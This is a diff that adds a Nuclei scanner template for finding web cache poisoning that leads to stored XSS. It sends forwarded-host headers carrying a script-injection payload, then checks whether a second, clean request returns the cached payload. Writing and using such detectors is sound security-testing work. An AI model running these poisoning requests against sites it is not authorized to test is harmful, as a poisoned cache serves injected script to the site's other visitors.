@@ -1,0 +1,38 @@
+id: cache-poisoning-xss
+
+info:
+  name: Cache Poisoning - Stored XSS
+  author: melbadry9,xelkomy,akincibor
+  severity: high
+  description: Cache Poisoning leads to Stored XSS.
+  reference:
+    - https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning
+    - https://portswigger.net/research/practical-web-cache-poisoning
+    - https://portswigger.net/web-security/web-cache-poisoning
+  metadata:
+    max-request: 2
+  tags: cache,generic,xss
+variables:
+  cache_key: "{{to_lower(rand_base(6))}}"
+  cache_header: "{{to_lower(rand_base(6))}}"
+  xss_payload: '"></script><script>alert(document.domain);</script>'
+
+http:
+  - raw:
+      - |
+        GET /?{{cache_key}}=1 HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Prefix: {{cache_header}}.xfp{{xss_payload}}
+        X-Forwarded-Host: {{cache_header}}.xfh{{xss_payload}}
+        X-Forwarded-For: {{cache_header}}.xff{{xss_payload}}
+      - |
+        GET /?{{cache_key}}=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body_2, cache_header)
+          - contains(body_2, xss_payload)
+        condition: and
+# digest: 490a00463044022064537a8b328d0bfa78c7ea621fc7ee914de3b3ce51ba7f4041e5127a748f78910220455d06d1cd04523e367f623bf39902232b90f3f6b426030a56ca6eca4f79a6fd:922c64590222798bb761d5b6d8e72950
